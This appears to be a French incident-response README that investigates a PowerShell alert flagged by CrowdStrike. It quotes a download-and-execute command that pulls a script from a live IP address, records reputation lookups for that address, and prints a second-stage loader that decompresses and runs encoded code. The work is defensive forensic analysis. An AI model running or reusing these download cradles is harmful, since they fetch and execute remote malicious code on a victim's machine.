# VanuatuForensic
  
## Plan d'actions
Liste des taches à accomplir :
- [ ] Définir le contexte
- [ ] Récupérer la commande powershell parente
- [ ] OSINT - Récupérer les informations de géoloc du serveur distant
- [ ] OSINT - Récupérer les informations de réputation du serveur distant
- [ ] Télécharger le fichier distant
- [ ] 



## Définir le contexte
TBD

## Récupérer la commande powershell parente

La commande fournie par CrowdStrike est la suivante : 
  
```
powershell -NonInteractive -EncodedCommand IEX ((new-object net.webclient).downloadstring('_URL_01_'))
```
  
_URL_01_ point vers :  
```
http://147.45.112.220/a
```
  
- [X] Récupérer la commande powershell parente



## OSINT - Récupérer les informations de géoloc du serveur distant
  
A partir de Maxmind, il est possible de récupérer les informations suivantes :
  
![image](https://github.com/user-attachments/assets/a87750f6-c1e1-47b6-a002-a8f11c168f71)

- [X] OSINT - Récupérer les informations de géoloc du serveur distant



## OSINT - Récupérer les informations de réputation du serveur distant

Le site Cisco Talos indique que l'IP possède une réputation plutôt "neutre" : 
  
![image](https://github.com/user-attachments/assets/546d02a9-593a-437b-bca7-461507fef710)
  
- [X] OSINT - Récupérer les informations de réputation du serveur distant



## Télécharger le fichier distant
  
Lorsque l'on télécharge le fichier distant, on obtient un contenu de la sorte :  
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("_B64_01_"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
  
_B64_01_ contient une chaine très longue qui ne ressemble pas à du BASE64 : 
![image](https://github.com/user-attachments/assets/271d6e1e-3c4c-42a0-9ebb-2c546999bb1b)  
  
- [X] Télécharger le script distant


## 

## 
